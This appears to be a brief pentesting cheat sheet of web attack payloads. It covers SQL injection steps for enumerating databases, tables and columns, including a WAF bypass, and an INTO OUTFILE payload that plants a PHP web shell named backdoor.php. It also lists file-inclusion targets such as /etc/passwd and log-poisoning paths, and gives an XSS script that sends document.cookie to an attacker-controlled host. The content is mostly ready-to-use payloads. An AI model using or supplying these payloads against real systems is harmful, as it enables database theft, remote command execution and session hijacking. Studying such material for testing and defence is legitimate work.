#  Web Common Vulnerabilities


## SQL Injeciton

1. Test for SQL Injection
- Use apostrophe(')
- Use (' or 1=1)
- User(' or 1='1 )

2. Determine the columns using the following:
- ?id=-1' order by 1-- - until the webserver repond with error
- ?id = 1 order by 1
- Use the (' UNION SELECT ALL DISTINCT NULL,-- - ) add more null or number until gets error
-  If there are WAF, use the folloing ('  UNION /* */ SELECT /* */ DISCTINCT)
-  If there are multiple vulnerable parameter, cut in half the payload. 

3. . . Determine the current database and list all the databases.
```
'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,group_concat(schema_name)+from+information_schema.schemata--+-
```

4. Enumerate tables:
```
'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,group_concat(table_name)+from+information_schema.tables+where+table_schema+=+'users'--+-
```

5. Enumerate columns:

```'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,group_concat(column_name)+from+information_schema.columns+where+table_name+=+'UserDetails'--+-

```

Writing file using sql injection 
`1 union all select 1,2,"<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';?> into OUTFILE 'c:/xampp/htdocs/backdoor.php'`

## FILE INCLUSION

1. For windows, we have to check for the following:
`c:\windows\system32\drivers\etc\hosts`
`c:\xampp\apache\logs\access.log&cmd=ipconfig`
2. For linux:
`/etc/passwd`
`/etc/php.ini`
`/etc/knockd.conf`

## XSS

1. Cookie stealer using XSS
`<script>new Image().src="http://<ip>/cool.jpg?output="+document.cookie;</script>`
